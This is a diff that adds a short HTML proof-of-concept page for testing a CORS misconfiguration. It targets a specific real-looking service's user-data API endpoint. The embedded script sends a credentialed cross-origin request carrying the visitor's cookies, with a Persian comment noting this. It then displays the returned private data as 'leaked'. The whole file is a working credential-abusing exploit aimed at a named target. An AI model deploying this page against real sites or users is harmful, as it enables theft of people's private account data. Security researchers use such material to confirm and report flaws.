@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>Testing CORS...</h1>
+    <script>
+        fetch('https://services.basalam.com/web/v1/explore/user/general/1?size=30', {
+            method: 'GET',
+            credentials: 'include' // این خط باعث میشه کوکی‌ها فرستاده بشن
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.body.innerHTML += "<h2>✅ Vulnerable! Data leaked:</h2>";
+            document.body.innerHTML += "<pre>" + data.substring(0, 500) + " (truncated)...</pre>";
+        })
+        .catch(error => {
+            document.body.innerHTML += "<h2>❌ Blocked by Browser (CORS Error)</h2>";
+            console.error(error);
+        });
+    </script>
+</body>
+</html>
